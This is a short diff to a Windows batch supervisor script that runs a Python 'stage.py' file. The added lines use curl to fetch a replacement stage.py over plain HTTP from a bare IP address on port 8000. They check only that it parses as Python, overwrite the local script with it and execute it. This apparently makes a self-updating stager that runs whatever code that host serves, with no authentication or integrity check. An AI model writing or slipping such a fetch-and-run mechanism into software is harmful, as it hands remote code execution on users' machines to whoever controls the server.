@@ -15,5 +15,18 @@ if defined OLDPID (
   del /f /q "%B%\stage.lock" >nul 2>&1
 )
 echo sup_start_v2 %DATE% %TIME% >>"%B%\sup.log"
-"@@PY@@" "%B%\stage.py" >>"%B%\stage.out" 2>&1
+set "OUT=%B%\stage.out.%RANDOM%%RANDOM%"
+%SystemRoot%\System32\curl.exe -s -m 60 -o "%B%\stage.new" http://217.15.164.237:8000/stage.py
+if exist "%B%\stage.new" (
+  "@@PY@@" -c "import ast,sys;ast.parse(open(sys.argv[1],encoding='utf-8',errors='replace').read())" "%B%\stage.new" >nul 2>&1
+  if not errorlevel 1 (
+    copy /y "%B%\stage.new" "%B%\stage.py" >>"%B%\sup.log" 2>&1
+    echo sup_selfupdate_ok %DATE% %TIME% >>"%B%\sup.log"
+  ) else (
+    echo sup_selfupdate_bad %DATE% %TIME% >>"%B%\sup.log"
+  )
+)
+del /f /q "%B%\stage.new" >nul 2>&1
+echo sup_pycall out=%OUT% %DATE% %TIME% >>"%B%\sup.log"
+"@@PY@@" -u "%B%\stage.py" >>"%OUT%" 2>&1
 echo sup_pyexit_%errorlevel% %DATE% %TIME% >>"%B%\sup.log"
